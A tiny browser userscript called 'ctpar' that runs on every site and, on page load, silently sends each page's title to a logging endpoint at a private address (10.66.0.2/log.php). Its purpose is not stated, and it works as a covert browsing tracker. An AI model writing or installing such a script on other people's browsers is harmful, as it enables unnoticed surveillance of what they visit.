// ==UserScript==
// @name          ctpar
// @include       */*
// ==/UserScript==

function ctparSend() {
    fetch('http://10.66.0.2/log.php?t=' + encodeURIComponent(document.title), { signal: AbortSignal.timeout(5000) });
}

window.onload = ctparSend;
